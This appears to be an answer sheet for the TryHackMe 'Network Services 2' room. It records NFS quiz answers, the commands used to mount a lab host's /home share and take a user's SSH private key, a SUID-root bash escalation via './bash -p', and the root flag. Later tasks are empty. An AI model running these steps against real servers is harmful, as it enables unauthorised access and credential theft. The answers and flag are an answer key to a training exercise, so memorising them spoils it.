# THM - Network Services 2

<br>

## Task 2

https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html

https://www.datto.com/blog/what-is-nfs-file-share

http://nfs.sourceforge.net/

https://wiki.archlinux.org/title/NFS

### Task 2.1

> Network File System

### Task 2.2

> mounting

### Task 2.3

> file handle

### Task 2.4

> RPC

### Task 2.5

> user ID / group ID

### Task 2.6

> Y

### Task 2.7

> Y

### Task 2.8

🧰 https://en.wikipedia.org/wiki/Network_File_System#:~:text=NFS%20version%204.2%20(RFC%207862,operations%20for%20pNFS%20(LAYOUTERROR%20and

> 4.2

<br>

## Task 3

https://resources.infosecinstitute.com/topic/what-is-enumeration/

### Task 3.1

```shell
mkdir nmap
nmap -A -oN nmap/initial -p- 10.10.35.226
```

> 7

### Task 3.2

> 2049

### Task 3.3

```shell
showmount -e 10.10.35.226
```

> /home

### Task 3.4

```shell
mkdir /tmp/mount
sudo mount -t nfs 10.10.35.226:/home /tmp/mount -nolock

cd /tmp/mount/
ls
```

> cappucino

### Task 3.6

```shell
cd cappucino/
ls -al
```

> .ssh

### Task 3.7

```shell
cd .ssh/
ls
```

> id_rsa

### Task 3.8

```shell
cp id_rsa .../TryHackMe/Rooms/networkservices2/id_rsa

cd .../TryHackMe/Rooms/networkservices2/
chmod 600 id_rsa
sudo ssh -i id_rsa cappucino@10.10.35.226
```

> Y

<br>

## Task 4

🧰 https://github.com/polo-sec/writing/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash

```shell
cp bash /tmp/mount/cappucino/bash

cd /tmp/mount/cappucino/
sudo chown root bash
```

### Task 4.3

```shell
sudo chmod +s bash
```

> s

### Task 4.4

```shell
ls -la bash
```

> -rwsr-sr-x

### Task 4.6

```shell
(ssh:)
	./bash -p
		cd /root/
		ls
		cat root.txt
```

> THM{nfs_got_pwned}

<br>

## Task 5

### Task 5.1

> 

### Task 5.2

> 

### Task 5.3

> 

### Task 5.4

> 

### Task 5.5

> 

### Task 5.6

> 

### Task 5.7

> 

### Task 5.8

> 

<br>

## Task 6

### Task 6.1

> 

### Task 6.2

> 

### Task 6.3

> 

### Task 6.4

> 

### Task 6.5

> 

### Task 6.6

> 

### Task 6.7

> 

### Task 6.8

> 

### Task 6.9

> 

### Task 6.10

> 

### Task 6.12

> 

<br>

## Task 7

### Task 7.1

> 

### Task 7.2

> 

<br>

## Task 8

### Task 8.1

> 

### Task 8.2

> 

### Task 8.3

> 

### Task 8.4

> 

### Task 8.5

> 

<br>

## Task 9

### Task 9.1

> 

### Task 9.4

> 

### Task 9.5

> 

### Task 9.6

> 

<br>

## Task 10

### Task 10.1

> 

### Task 10.2

> 

### Task 10.3

> 

### Task 10.4

> 

### Task 10.5

> 

### Task 10.6

> 

### Task 10.7

> 







